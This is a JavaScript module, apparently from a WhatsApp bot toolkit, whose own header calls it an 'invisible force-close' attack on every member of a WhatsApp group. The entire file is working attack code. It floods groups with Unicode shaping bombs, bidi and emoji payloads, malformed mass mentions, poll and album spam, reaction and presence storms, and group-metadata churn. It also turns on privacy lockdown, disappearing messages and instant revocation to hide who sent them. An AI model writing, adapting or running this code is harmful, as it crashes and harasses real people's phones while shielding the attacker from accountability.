// ./SY/S7/groupdrop.js
// groupdrop — group-wide invisible force-close for Android + iOS.
// Fan-out via group metadata churn (subject/description/picture/settings)
// + shaping bombs embedded in metadata (renders on every member's device
// in chat list AND inside chat) + ephemeral crash payloads to group JID
// + mention storm + invite revoke churn.
// All sends LID-routed, ephemeral wrapped, immediately revoked.
// Single burst, no time loop, no hour arg.

const {
    generateWAMessageFromContent,
    delay,
} = require('@whiskeysockets/baileys');

// ---------- relay with ephemeral ----------
async function relay(client, groupJid, content, opts = {}) {
    const userJid = client?.user?.id || client?.authState?.creds?.me?.id;
    const waMsg = generateWAMessageFromContent(groupJid, content, {
        userJid,
        timestamp: new Date(),
        ephemeralExpiration: opts.ephemeral ?? 1,
        ephemeralSettingTimestamp: Date.now(),
    });
    await client.relayMessage(groupJid, waMsg.message, {
        messageId: waMsg.key.id,
        ...opts,
    });
    return waMsg.key.id;
}

// ---------- send + vanish ----------
async function sendAndVanish(client, groupJid, content, revokeDelay = 60) {
    let key;
    try {
        const userJid = client?.user?.id || client?.authState?.creds?.me?.id;
        const waMsg = generateWAMessageFromContent(groupJid, content, {
            userJid,
            timestamp: new Date(),
            ephemeralExpiration: 1,
            ephemeralSettingTimestamp: Date.now(),
        });
        await client.relayMessage(groupJid, waMsg.message, {
            messageId: waMsg.key.id,
        });
        key = waMsg.key;
    } catch { return null; }
    if (key) {
        setTimeout(() => {
            client.sendMessage(groupJid, { delete: key }).catch(() => {});
        }, revokeDelay);
    }
    return key;
}

// ---------- privacy arm ----------
async function armPrivacy(client) {
    const ops = {
        updateLastSeenPrivacy: 'none',
        updateOnlinePrivacy: 'none',
        updateProfilePicturePrivacy: 'none',
        updateStatusPrivacy: 'none',
        updateReadReceiptsPrivacy: 'none',
        updateGroupsAddPrivacy: 'none',
        updateCallPrivacy: 'none',
    };
    let ok = 0;
    for (const [m, v] of Object.entries(ops)) {
        if (typeof client[m] !== 'function') continue;
        try { await client[m](v); ok++; } catch {}
    }
    return ok;
}

async function enableDisappearing(client, seconds = 1) {
    try {
        if (typeof client.updateDefaultDisappearingMode === 'function') {
            await client.updateDefaultDisappearingMode(seconds);
            return true;
        }
    } catch {}
    return false;
}

// ---------- payload builders ----------
function buildShaping(seed = 0) {
    const c =
        '\u0300\u0301\u0302\u0303\u0304\u0305\u0306\u0307' +
        '\u0308\u0309\u030A\u030B\u030C\u030D\u030E\u030F';
    const cluster = 'x' + c.repeat(12);
    return cluster.repeat(2500 + seed * 400);
}

function buildBidi() {
    const b = '\u2066\u2067\u2068\u2069\u202A\u202B\u202C\u202D\u202E';
    return b.repeat(1200);
}

function buildEmoji() {
    const chain = '👨\u200D👩\u200D👧\u200D👦\u200D🧑\u200D👨\u200D🦱\u200D👩\u200D🦰';
    return chain.repeat(300);
}

function buildMega(seed = 0) {
    return buildShaping(seed) + buildBidi() + buildEmoji();
}

// ============================================================
// VECTOR 1 — subject churn (renders in every member's chat list)
// Rapid subject change = push notification to every member +
// chat list rebuild on every device.
// ============================================================
async function subjectChurn(client, groupJid, rounds = 20) {
    if (typeof client.groupUpdateSubject !== 'function') return;
    for (let i = 0; i < rounds; i++) {
        const bomb = buildShaping(i).slice(0, 250);
        try {
            await client.groupUpdateSubject(groupJid, `x${i}_${bomb}`);
        } catch {}
        await delay(350);
    }
}

// ============================================================
// VECTOR 2 — description churn with shaping bomb
// Description renders inside group info; shaping storm on every
// device that opens the group.
// ============================================================
async function descriptionChurn(client, groupJid, rounds = 20) {
    if (typeof client.groupUpdateDescription !== 'function') return;
    for (let i = 0; i < rounds; i++) {
        const bomb = buildMega(i).slice(0, 2000);
        try {
            await client.groupUpdateDescription(groupJid, bomb);
        } catch {}
        await delay(400);
    }
}

// ============================================================
// VECTOR 3 — setting churn (announce/locked toggling)
// Pushes system message to every member per toggle.
// ============================================================
async function settingChurn(client, groupJid, rounds = 30) {
    if (typeof client.groupSettingUpdate !== 'function') return;
    const states = ['announcement', 'not_announcement', 'locked', 'unlocked'];
    for (let i = 0; i < rounds; i++) {
        try {
            await client.groupSettingUpdate(groupJid, states[i % states.length]);
        } catch {}
        await delay(300);
    }
}

// ============================================================
// VECTOR 4 — invite link revoke churn
// New link pushed to all admins/members per revoke.
// ============================================================
async function inviteRevokeChurn(client, groupJid, rounds = 10) {
    if (typeof client.groupRevokeInvite !== 'function') return;
    for (let i = 0; i < rounds; i++) {
        try { await client.groupRevokeInvite(groupJid); } catch {}
        await delay(500);
    }
}

// ============================================================
// VECTOR 5 — ephemeral mega-payload to group (all members receive)
// Shaping + bidi + emoji combined, ephemeral=1 + instant revoke.
// ============================================================
async function ephemeralMega(client, groupJid, rounds = 15) {
    for (let i = 0; i < rounds; i++) {
        try {
            await sendAndVanish(client, groupJid, {
                viewOnceMessage: {
                    message: {
                        extendedTextMessage: {
                            text: buildMega(i),
                            contextInfo: { mentionedJid: [groupJid] },
                        },
                    },
                },
            });
        } catch {}
        await delay(300);
    }
}

// ============================================================
// VECTOR 6 — mention storm
// Malformed mention matrix in group context hits all members'
// notification + resolver pipeline.
// ============================================================
async function mentionStorm(client, groupJid, rounds = 15) {
    for (let i = 0; i < rounds; i++) {
        const jids = [];
        for (let k = 0; k < 200; k++) {
            jids.push(`${'1'.repeat(15)}${k}${i}@s.whatsapp.net`);
            jids.push(`${'2'.repeat(15)}${k}${i}@g.us`);
            jids.push(`${'3'.repeat(15)}${k}${i}@broadcast`);
            jids.push(`${'4'.repeat(15)}${k}${i}@lid`);
        }
        try {
            await sendAndVanish(client, groupJid, {
                extendedTextMessage: {
                    text: 'M'.repeat(200),
                    contextInfo: {
                        mentionedJid: jids,
                        conversionSource: 'mention',
                    },
                },
            });
        } catch {}
        await delay(250);
    }
}

// ============================================================
// VECTOR 7 — poll bomb in group
// Each poll renders on every member's device.
// ============================================================
async function groupPollBomb(client, groupJid, rounds = 10) {
    const options = [];
    for (let i = 0; i < 100; i++) {
        options.push({ optionName: `o${i}_${'x'.repeat(80)}` });
    }
    for (let r = 0; r < rounds; r++) {
        try {
            await sendAndVanish(client, groupJid, {
                pollCreationMessageV3: {
                    name: `p${r}_${'P'.repeat(240)}`,
                    options,
                    selectableOptionsCount: 1,
                },
            });
        } catch {}
        await delay(400);
    }
}

// ============================================================
// VECTOR 8 — album type-mix in group
// ============================================================
async function groupAlbumMix(client, groupJid, albums = 8) {
    for (let a = 0; a < albums; a++) {
        const albumId = `GD${Date.now()}${a}`;
        const ts = Math.floor(Date.now() / 1000);
        const types = ['image', 'video', 'audio', 'sticker'];
        for (let g = 0; g < 4; g++) {
            const t = types[g];
            let content;
            if (t === 'image') {
                content = { imageMessage: {
                    url: `https://mmg.whatsapp.net/gd-${a}-${g}`,
                    mimetype: 'image/jpeg',
                    fileSha256: new Uint8Array(32),
                    fileEncSha256: new Uint8Array(32),
                    mediaKey: new Uint8Array(32),
                    fileLength: 5000000,
                    height: 1080, width: 1080,
                    directPath: `/v/t62.7118-24/gd`,
                    mediaKeyTimestamp: ts,
                    contextInfo: { albumId },
                }};
            } else if (t === 'video') {
                content = { videoMessage: {
                    url: `https://mmg.whatsapp.net/gd-${a}-${g}`,
                    mimetype: 'video/mp4',
                    fileSha256: new Uint8Array(32),
                    fileEncSha256: new Uint8Array(32),
                    mediaKey: new Uint8Array(32),
                    fileLength: 50000000,
                    seconds: 8,
                    directPath: `/v/t62.7118-24/gd`,
                    mediaKeyTimestamp: ts,
                    contextInfo: { albumId },
                }};
            } else if (t === 'audio') {
                content = { audioMessage: {
                    url: `https://mmg.whatsapp.net/gd-${a}-${g}`,
                    mimetype: 'audio/ogg; codecs=opus',
                    fileSha256: new Uint8Array(32),
                    fileEncSha256: new Uint8Array(32),
                    mediaKey: new Uint8Array(32),
                    fileLength: 100000,
                    seconds: 30,
                    directPath: `/v/t62.7117-24/gd`,
                    mediaKeyTimestamp: ts,
                    contextInfo: { albumId },
                }};
            } else {
                content = { stickerMessage: {
                    url: `https://mmg.whatsapp.net/gd-${a}-${g}`,
                    fileSha256: new Uint8Array(32),
                    fileEncSha256: new Uint8Array(32),
                    mediaKey: new Uint8Array(32),
                    mimetype: 'image/webp',
                    height: 512, width: 512,
                    directPath: `/v/t62.7118-24/gd`,
                    mediaKeyTimestamp: ts,
                    contextInfo: { albumId },
                }};
            }
            try { await sendAndVanish(client, groupJid, content); } catch {}
            await delay(80);
        }
        await delay(250);
    }
}

// ============================================================
// VECTOR 9 — reaction storm on group seed message
// ============================================================
async function groupReactionStorm(client, groupJid, count = 1500) {
    let seedId;
    try {
        seedId = await relay(client, groupJid, { conversation: '.' });
    } catch { return; }
    await delay(400);
    const emojis = ['🔥','💀','⚡','👿','💣','🚨','😈','☠️'];
    for (let i = 0; i < count; i++) {
        try {
            await client.sendMessage(groupJid, {
                react: {
                    text: emojis[i % emojis.length],
                    key: { remoteJid: groupJid, id: seedId, fromMe: true },
                },
            });
        } catch {}
        if (i % 100 === 0) await delay(200);
    }
}

// ============================================================
// VECTOR 10 — presence churn in group
// "typing..." flash to everyone.
// ============================================================
async function groupPresenceChurn(client, groupJid, rounds = 100) {
    const states = ['composing', 'paused', 'recording', 'paused'];
    for (let i = 0; i < rounds; i++) {
        try {
            if (typeof client.sendPresenceUpdate === 'function') {
                await client.sendPresenceUpdate(states[i % states.length], groupJid);
            }
        } catch {}
        await delay(90);
    }
}

// ============================================================
// ORCHESTRATOR
// ============================================================
async function groupDrop(client, groupJid, options = {}) {
    if (!client) throw new Error('groupdrop: client required');
    if (!groupJid) throw new Error('groupdrop: groupJid required');
    if (!groupJid.endsWith('@g.us')) {
        throw new Error('groupdrop: groupJid must end with @g.us');
    }

    const arm = options.arm !== false;

    const privacyArmed = arm ? await armPrivacy(client) : 0;
    const disappearing = arm ? await enableDisappearing(client, 1) : false;

    // Verify we are admin (metadata ops need admin)
    let isAdmin = false;
    try {
        const meta = await client.groupMetadata(groupJid);
        const me = client.user?.id || client.authState?.creds?.me?.id;
        const meNum = me?.split(':')[0]?.split('@')[0];
        const participant = meta.participants.find(p => {
            const pid = p.id?.split('@')[0]?.split(':')[0];
            return pid === meNum;
        });
        isAdmin = participant?.admin === 'admin' || participant?.admin === 'superadmin';
    } catch {}

    const report = {
        groupJid,
        privacyArmed,
        disappearing,
        isAdmin,
        bursts: 0,
        vectors: {},
    };

    const bursts = Number.isFinite(options.bursts) ? options.bursts : 3;
    const gapMs  = Number.isFinite(options.gapMs)  ? options.gapMs  : 700;

    for (let b = 0; b < bursts; b++) {
        const runs = [
            // Fan-out metadata (only if admin)
            ['subject',     () => isAdmin ? subjectChurn(client, groupJid, 15) : Promise.resolve()],
            ['description', () => isAdmin ? descriptionChurn(client, groupJid, 12) : Promise.resolve()],
            ['setting',     () => isAdmin ? settingChurn(client, groupJid, 20) : Promise.resolve()],
            ['invite',      () => isAdmin ? inviteRevokeChurn(client, groupJid, 8) : Promise.resolve()],

            // Payload-based (works regardless of admin)
            ['ephemeralmega', () => ephemeralMega(client, groupJid, 12)],
            ['mentions',      () => mentionStorm(client, groupJid, 10)],
            ['pollbomb',      () => groupPollBomb(client, groupJid, 8)],
            ['albummix',      () => groupAlbumMix(client, groupJid, 6)],
            ['reactions',     () => groupReactionStorm(client, groupJid, 1000)],
            ['presence',      () => groupPresenceChurn(client, groupJid, 80)],
        ];

        const results = await Promise.allSettled(runs.map(([, fn]) => fn()));
        runs.forEach(([name], i) => {
            const ok = results[i].status === 'fulfilled';
            report.vectors[name] = (report.vectors[name] || 0) + (ok ? 1 : 0);
        });

        report.bursts++;
        await delay(gapMs);
    }

    return report;
}

module.exports = {
    groupDrop,
    subjectChurn,
    descriptionChurn,
    settingChurn,
    inviteRevokeChurn,
    ephemeralMega,
    mentionStorm,
    groupPollBomb,
    groupAlbumMix,
    groupReactionStorm,
    groupPresenceChurn,
    armPrivacy,
    enableDisappearing,
};
